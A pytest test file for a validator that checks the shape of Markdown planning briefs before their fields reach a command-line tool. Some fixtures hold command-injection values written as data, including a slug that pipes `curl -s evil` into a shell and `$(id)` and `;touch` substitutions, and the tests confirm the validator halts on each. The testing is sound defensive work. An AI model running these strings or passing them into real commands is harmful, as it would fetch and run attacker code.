"""The plan's brief check: a hard brief's shape, held before its cut is queued.

Each brief written under `tmp_path`. Why: 0083-plan-queues design D1.
"""

import importlib.util
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPT = _REPO / "skills" / "mf-plan" / "scripts" / "brief_check.py"


def _load(path: Path) -> ModuleType:
    spec = importlib.util.spec_from_file_location("brief_check", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


brief_check = _load(_SCRIPT)

_READY = """\
# Plan queues · a minor · hard · 2026-11-06

**The plan queues its cut.**

At f349aa8, 2026-11-06.

## Decisions
| # | decision | the reason that settled it |
|---|---|---|
| 1 | a check · **Acceptance:** `make gate` | P11 |

## For the cut
1. **`0083-plan-queues`** · `minor` · after: none · debt: none · decide: recommended
   - models: build opus high · converge opus high · release opus high · cut opus high
   - **Acceptance:** the check halts on a `$(…)` in a command; Verify:
     `grep -n 'x' f` prints a line
"""

_OUT_OF_SHAPE = """\
# Plan queues · a minor · light · 2026-11-05

At --output=x, 2026-11-05.

## Decisions
| # | decision | the reason that settled it |
|---|---|---|
| 1 | a search · Verify: `grep -c $(cat f) x` | P11 |
| 2 | the gate · **Acceptance:** `cd x && make gate` | P11 |

## For the cut

"""


def _write(tmp_path: Path, text: str) -> Path:
    brief = tmp_path / "brief.md"
    brief.write_text(text)
    return brief


def test_a_hard_brief_is_ready_for_the_cut(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    brief = _write(tmp_path, _READY)
    assert brief_check.main([str(brief)]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    done = subprocess.run(
        [sys.executable, str(_SCRIPT), str(brief)], capture_output=True, text=True
    )
    assert (done.returncode, done.stdout) == (0, "brief: ready for the cut\n")
    # A tenth item, its lines nested three spaces in as the template writes them.
    tenth = _READY + (
        "10. **a-ten** · minor · after: none · debt: none · decide: recommended\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
        "   - **Acceptance:** `make gate` passes\n"
    )
    assert brief_check.main([str(_write(tmp_path, tenth))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    # The unattended cut's line, written right after the list, folds into no head.
    cut = _READY + "Cut 2026-11-07 as 0083-plan-queues at f349aa8.\n"
    assert brief_check.main([str(_write(tmp_path, cut))]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"


def test_a_brief_out_of_shape_halts(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert brief_check.main([str(_write(tmp_path, _OUT_OF_SHAPE))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — the title says light: /mf-plan <what> depth=hard from=<brief>",
        "brief: halt — no At <sha>, <YYYY-MM-DD>. line",
        "brief: halt — ## For the cut is empty",
        "brief: halt — ## Decisions: I19 — `$(…)`: `grep -c $(cat f) x`",
        "brief: halt — ## Decisions: I19 — `cd`: `cd x && make gate`",
    ]
    untitled = _READY.replace(" · hard", "")
    assert brief_check.main([str(_write(tmp_path, untitled))]) == 1
    assert capsys.readouterr().out == "brief: halt — the title names no depth\n"
    # The fields the close pastes into `conduct.py cut`, each held to its shape.
    heads = _READY + (
        "2. **x$(curl -s evil|sh)** · major · after: [0082-cut-station, $(id)]\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high;touch\n"
        "3. **ship-fixes** · patch\n"
        "   - models: build opus high\n"
        "4. **ok** · patch · after: none\n"
    )
    assert brief_check.main([str(_write(tmp_path, heads))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: item 2 — not a slug: `x$(curl -s evil|sh)`",
        "brief: halt — ## For the cut: item 2 — not a bump: `major`",
        "brief: halt — ## For the cut: item 2 — not an after id: `$(id)`",
        "brief: halt — ## For the cut: item 2 — not a model or effort: `high;touch`",
        "brief: halt — ## For the cut: item 3 — no after:",
        "brief: halt — ## For the cut: item 3 — the models line is not"
        " build · converge · release · cut, each <model> <effort>",
        "brief: halt — ## For the cut: item 4 — no models line",
    ]
    # An item that opens no number, and a head with a second after:, halt; so does a
    # second after: on a lazy line, which Markdown folds into the head.
    shapes = _READY + (
        "- **x;y** · minor · after: none\n"
        "5. **ok** · minor · after: none · after: a;touch-p\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
        "6. **ok** · minor · after: none\n"
        "· after: a;touch-q\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    assert brief_check.main([str(_write(tmp_path, shapes))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: not a numbered item:"
        " `- **x;y** · minor · after: none`",
        "brief: halt — ## For the cut: item 5 — more than one after:",
        "brief: halt — ## For the cut: item 6 — more than one after:",
    ]
    # A vertical tab breaks no Markdown line: the text past it stays in the head.
    tabbed = _READY + (
        "5. **ok** · minor · after: none\x0b· after: a;touch-p\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    assert brief_check.main([str(_write(tmp_path, tabbed))]) == 1
    assert capsys.readouterr().out == (
        "brief: halt — ## For the cut line 5: whitespace other than a space or a tab\n"
        "brief: halt — ## For the cut: item 5 — not an after id:"
        " `none\x0b· after: a;touch-p`\n"
    )
    # Only spaces and tabs blank a Markdown line or indent one: a line of NBSP, U+3000,
    # `\x0b` or `\x0c`, or NBSP before `- x`, halts, and folds into the head with the
    # lazy line.
    models = (
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    unblank = _READY + "".join(
        f"{n}. **ok** · minor · after: none\n{line}\n· after: a;touch-q\n{models}"
        for n, line in (
            (2, "\xa0"),
            (3, "\N{IDEOGRAPHIC SPACE}"),
            (4, "\x0b"),
            (5, "\x0c"),
            (6, "\xa0\xa0\xa0\xa0- x"),
        )
    )
    assert brief_check.main([str(_write(tmp_path, unblank))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        *(
            f"brief: halt — ## For the cut line {n}: whitespace other than a space"
            " or a tab"
            for n in (6, 10, 14, 18, 22)
        ),
        *(
            f"brief: halt — ## For the cut: item {n} — more than one after:"
            for n in range(2, 7)
        ),
    ]
    # A `## Decisions` line, R5's NBSP-led head after a blank line with its models line,
    # and an NBSP-led Acceptance line, which no item holds, halt by the line.
    hidden = _READY.replace("| 1 | a check", "| 1 |\N{IDEOGRAPHIC SPACE}a check") + (
        "\n"
        "\xa02. **x;touch-q** · minor · after: none\n"
        "\xa0\xa0\xa0\xa0- models: build a b · converge a b · release a b · cut a b;c\n"
        "\n"
        "\xa0\xa0\xa0\xa0- **Acceptance:** `echo $(id) x`\n"
    )
    assert brief_check.main([str(_write(tmp_path, hidden))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        f"brief: halt — {heading} line {n}: whitespace other than a space or a tab"
        for heading, n in (
            ("## Decisions", 3),
            ("## For the cut", 6),
            ("## For the cut", 7),
            ("## For the cut", 9),
        )
    ]
    # A second `## For the cut` heading written with NBSP or U+3000 is the same
    # section, so its items are checked as a plain second heading's are.
    spaced_heading = _READY + "".join(
        f"\n## For{space}the cut\n"
        f"{n}. **x;touch-q** · minor · after: none\n"
        "   - models: build a b · converge a b · release a b · cut a b;c\n"
        "   - **Acceptance:** `echo $(id) x`\n"
        for n, space in ((2, "\xa0"), (3, "\N{IDEOGRAPHIC SPACE}"))
    )
    assert brief_check.main([str(_write(tmp_path, spaced_heading))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        *(
            line
            for n in (2, 3)
            for line in (
                f"brief: halt — ## For the cut: item {n} — not a slug: `x;touch-q`",
                f"brief: halt — ## For the cut: item {n} — not a model or effort:"
                " `b;c`",
            )
        ),
        *2 * ["brief: halt — ## For the cut: I19 — `$(…)`: `echo $(id) x`"],
    ]
    # A heading starts a new list, so a three-space `- ` line first under a second
    # `## For the cut` is a top-level item, not nested under the first one's last head.
    second_list = _READY + "".join(
        f"\n{heading}\n   - **x;touch-q** · minor · after: none\n"
        for heading in ("## Notes\n## For the cut", "## For\xa0the cut")
    )
    assert brief_check.main([str(_write(tmp_path, second_list))]) == 1
    assert capsys.readouterr().out.splitlines() == 2 * [
        "brief: halt — ## For the cut: not a numbered item:"
        " `   - **x;touch-q** · minor · after: none`"
    ]
    # Any other list marker, or an indent short of the head's text, opens no number.
    markers = _READY + (
        "* **x;touch-p** · minor · after: none\n"
        " - **y;touch-p** · minor · after: none\n"
        "+ **z** · minor · after: none\n"
        "  2) **w** · minor · after: none\n"
        "   * a nested note\n"
    )
    assert brief_check.main([str(_write(tmp_path, markers))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: not a numbered item:"
        " `* **x;touch-p** · minor · after: none`",
        "brief: halt — ## For the cut: not a numbered item:"
        " ` - **y;touch-p** · minor · after: none`",
        "brief: halt — ## For the cut: not a numbered item:"
        " `+ **z** · minor · after: none`",
        "brief: halt — ## For the cut: not a numbered item:"
        " `  2) **w** · minor · after: none`",
    ]
    # A tab or extra spaces after a head's number opens no `<n>. `; under a `10. `
    # head, only the template's own lines sit three spaces in.
    spaced = _READY + (
        "2.\t**x;touch-p** · minor · after: a;touch-q\n"
        "3.  **ok** · minor · after: none\n"
        "    - models: build a b · converge a b · release a b · cut a b\n"
        "   - **y;touch-p** · minor · after: a;touch-q\n"
        "10. **ok** · minor · after: none\n"
        "   - **z;touch-p** · minor · after: a;touch-q\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
    )
    assert brief_check.main([str(_write(tmp_path, spaced))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: not a numbered item:"
        " `2.\t**x;touch-p** · minor · after: a;touch-q`",
        "brief: halt — ## For the cut: not a numbered item:"
        " `3.  **ok** · minor · after: none`",
        "brief: halt — ## For the cut: not a numbered item:"
        " `   - **z;touch-p** · minor · after: a;touch-q`",
    ]
    # A models line in another form, or a second one, halts.
    twice = _READY + (
        "2. **ok** · minor · after: none\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
        "   * models: build a b · converge a b · release a b · cut a b;c\n"
        "   -\tmodels: build a b · converge a b · release a b · cut a b;c\n"
        "   -  models: build a b · converge a b · release a b · cut a b;c\n"
        "   - models: build a b · converge a b · release a b · cut a b\n"
    )
    assert brief_check.main([str(_write(tmp_path, twice))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: a models line not written `- models:`:"
        " `   * models: build a b · converge a b · release a b · cut a b;c`",
        "brief: halt — ## For the cut: a models line not written `- models:`:"
        " `   -\tmodels: build a b · converge a b · release a b · cut a b;c`",
        "brief: halt — ## For the cut: a models line not written `- models:`:"
        " `   -  models: build a b · converge a b · release a b · cut a b;c`",
        "brief: halt — ## For the cut: item 2 — more than one models line",
    ]


def test_what_cannot_be_checked_exits_2(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    missing = tmp_path / "no-brief.md"
    assert brief_check.main([str(missing)]) == 2
    assert capsys.readouterr().out == (
        f"brief: cannot check — {missing}: No such file or directory\n"
    )
    odd = _READY + "   - Verify: `make gate` and a ` stray\n"
    assert brief_check.main([str(_write(tmp_path, odd))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — ## For the cut: a backtick opens no span\n"
    )
    unclosed = _READY + "   - Verify: `grep -n 'x f` prints a line\n"
    assert brief_check.main([str(_write(tmp_path, unclosed))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — ## For the cut: No closing quotation: `grep -n 'x f`\n"
    )
    monkeypatch.setattr(brief_check, "CONDUCT", tmp_path / "conduct.py")
    assert brief_check.main([str(_write(tmp_path, _READY))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — no conduct.py beside this skill\n"
    )
    monkeypatch.setattr(brief_check, "VERIFY_CHECK", tmp_path / "verify_check.py")
    assert brief_check.main([str(_write(tmp_path, _READY))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — no verify_check.py beside this skill\n"
    )
